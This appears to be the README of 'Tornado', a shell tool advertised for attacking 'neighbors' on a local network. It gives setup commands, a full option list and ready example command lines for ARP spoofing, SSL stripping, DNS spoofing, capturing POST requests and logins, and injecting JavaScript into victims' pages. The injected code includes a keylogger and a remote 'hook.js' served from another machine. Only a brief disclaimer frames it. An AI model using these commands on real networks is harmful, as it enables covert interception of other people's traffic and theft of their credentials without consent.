# TORNADO
## The easiest way to play with neighbors
### setup
```
git clone https://github.com/rebellionil/tornado
cd tornado 
bash setup.sh
```
### ```~# ./tornado.sh -h ``` output 
```

                       ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗  
                       ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
                          ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
                          ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
                          ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
                          ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝||╚═════╝ 
                           - Version 0.2 [CODED BY MAGDY MOUSTAFA]       ||||       
                           - github.com/rebellionil/tornado           |__||||__|    
                           - facebook.com/rebellionil                 ++++++++++    
                                                                      ||||||||||    

 ┌════════════════════════════════════════════════════════════════════════════════════════════════════════════════┐ 
 █ -h --help                   => guess what ?                                                                    █ 
 ║ -I --iface-info             => print connected interfaces information and exit                                 ║ 
 █ -t --target    <TARGET>     => specify target                                                                  █ 
 ║ -g --gateway   <Gateway>    => specify gateway                                                                 ║ 
 ║ -i --interface <iface>      => specify an interface                                                            ║ 
 ║ -o --savelog   <NAME>       => save sslstrip+ results                                                          ║ 
 ║ -f --forward   <on/off>     => don't forward traffic                                         [on|OFF]          ║ 
 ║ -c --no-colors              => remove colors from output                                     [on|OFF]          ║ 
 ║ -d --driftnet               => enable driftnet to extract images from session pcap file      [on|OFF]          ║ 
 ║ -u --urlsnarf               => log GET/POST requests with urlsnarf                           [on|OFF]          ║ 
 ║ -s --silent                 => run arpspoof and dns2proxy in background                      [on|OFF]          ║ 
 ║ -k --tshark                 => capture detailed post requests info with tshark               [on|OFF]          ║ 
 ║ -e --ettercap               => capture post requests with ettercap (RECOMMENDED)             [on|OFF]          ║ 
 ║ -m --tcpdump                => capture post requests with TCPdump                            [on|OFF]          ║ 
 ║ -K --tskark+                => capture GET/POST requests headers with tshark                 [on|OFF]          ║ 
 ║ -p --dnsspoof               => DNS spoofing with dns2proxy (DOMAIN => FAKE_IP)               [on|OFF]          ║ 
 ║ -r --iptraf                 => monitor network traffic with iptraf-ng                        [on|OFF]          ║ 
 ║ -a --etherape               => monitor network traffic with etherape                         [on|OFF]          ║ 
 ║ -C --no-check               => don't verify if targets are reachable or not                  [on|OFF]          ║ 
 ║ -x --burp                   => intercept captured traffic with burpsuite                                       ║ 
 ║ -X --mitmproxy              => intercept captured traffic with MITMproxy                                       ║ 
 ║ -H --hsts                   => intercept captured traffic with sslstrip+,dns2proxy                             ║ 
 ║ -w --mitmproxy-args         => customize mitmproxy performance [must be the last option when use]              ║ 
 ║ -l --js-url    <js URL>     => inject JS url in page content                                                   ║ 
 ║ -L --js-code   <js code>    => inject JS code from JS file in page content [must be one line]                  ║ 
 ║ -G --js-keylogger           => inject JS keylogger in html pages                                               ║ 
 ║ -M --map-lan   <nmap args>  => perform a nmap network scan from tornado !                                      ║ 
 ║ usage. ./tornado.sh <options>                                                                                  ║ 
 ║ eg. ./tornado.sh -t 192.168.1.1/24 --map-lan -F                                                                ║ 
 ║ eg. ./tornado.sh -t 192.168.1.1/24 --map-lan --script vuln -p 80                                               ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.50 -g 192.168.1.1 -a --mitmproxy --mitmproxy-args --no-mouse            ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.1/24 -g 192.168.1.1 --ettercap --hsts -o ssl.log                        ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -f                                                    ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -l http://192.168.1.100:3000/hook.js                  ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -L alert.js --js-keylogger                            ║ 
 █ eg. ./tornado.sh -i wlan0 -t 192.168.1.2,192.168.1.5,192.168.1.10 -g 192.168.1.1 --hsts -e -k -d -u            █ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --burp                                                 ║ 
 █ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --dnsspoof dnsfile.txt                                 █ 
 └════════════════════════════════════════════════════════════════════════════════════════════════════════════════┘ 

```
```
Version release: 0.2-STABLE
Author: Magdy Moustafa  [ rebellionil ]
Distros Supported: Linux Ubuntu, Kali, Debian, BackBox, Parrot OS
```
## LEGAL DISCLAMER
```
The author does not hold any responsibility for the bad use of this tool,
remember that attacking targets without prior consent it's illegal and punished by law.
```
## Tornado limitations
```
1º - Tornado will fail if target system its protected againt arp poison atacks
2º - target system sometimes needs to clear the net cache for arp poison to be effective
3º - many attacks described in tornado may be dropped by the target HSTS detection sys.
```
## Dependencies
```
nmap, iptraf-ng, sslstrip2, dns2proxy, mitmproxy, burpsuite, tshark, tcpdump, ettercap, etherape, urlsnarf, arpspoof, driftnet, arp-scan
```

### EOF



